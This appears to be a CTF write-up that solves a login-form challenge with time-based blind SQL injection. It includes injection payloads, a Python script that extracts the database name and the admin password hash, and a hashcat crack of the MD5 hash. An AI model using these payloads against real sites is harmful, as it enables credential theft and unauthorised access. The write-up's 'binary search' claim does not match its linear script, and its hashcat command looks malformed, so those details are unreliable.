+++
title = "Blind SQLi Login Bypass"
date = "2025-03-10"
description = "Exploiting a time-based blind SQL injection in a login form to extract admin credentials and bypass authentication."
tags = ["sqli", "web", "authentication"]
categories = ["web"]
difficulty = "medium"
category = "Web"
points = "250"
ctf_name = "NullCon CTF 2025"
challenge_author = "d4rkfl0w"
solves = "47"
+++

## Challenge Description

We are given a web application with a login form. The goal is to gain access to the admin panel and retrieve the flag. The application uses a MySQL backend.

## Reconnaissance

Starting with basic enumeration of the login form:

```
POST /login HTTP/1.1
Host: challenge.nullcon.net:8080
Content-Type: application/x-www-form-urlencoded

username=admin&password=test
```

The response time for valid vs invalid usernames differs slightly, indicating potential time-based behavior.

## Analysis

Testing for SQL injection in the username field:

```sql
admin' AND SLEEP(3)-- -
```

The response was delayed by approximately 3 seconds, confirming a time-based blind SQL injection vulnerability.

The backend query likely looks like:

```sql
SELECT * FROM users WHERE username='$input' AND password='$pass'
```

## Exploitation

### Step 1: Extract Database Name

Using a binary search approach with `SUBSTRING` and `ASCII`:

```python
import requests
import time

url = "http://challenge.nullcon.net:8080/login"
charset = "abcdefghijklmnopqrstuvwxyz0123456789_"
result = ""

for pos in range(1, 30):
    for char in charset:
        payload = f"admin' AND IF(SUBSTRING(database(),{pos},1)='{char}',SLEEP(2),0)-- -"
        start = time.time()
        r = requests.post(url, data={
            "username": payload,
            "password": "x"
        })
        elapsed = time.time() - start
        if elapsed >= 2:
            result += char
            print(f"[+] Database: {result}")
            break
```

Result: `ctf_challenge_db`

### Step 2: Extract Admin Password Hash

```python
# Modified payload for password extraction
payload = f"admin' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),{pos},1)='{char}',SLEEP(2),0)-- -"
```

Extracted hash: `5f4dcc3b5aa765d61d8327deb882cf99`

### Step 3: Crack the Hash

```
$ echo "5f4dcc3b5aa765d61d8327deb882cf99" | hashcat -m 0 -a 0 rockyou.txt
5f4dcc3b5aa765d61d8327deb882cf99:password
```

### Step 4: Access Admin Panel

Logging in with `admin:password` reveals the flag on the dashboard.

## Flag

<div class="flag-box">FLAG{bl1nd_sql1_t1m3_b4s3d_m4st3r}</div>

## Takeaways

- Time-based blind SQLi is slower but reliable when error-based injection is not possible
- Binary search reduces the number of requests significantly compared to linear enumeration
- Always hash passwords with bcrypt/argon2, not MD5
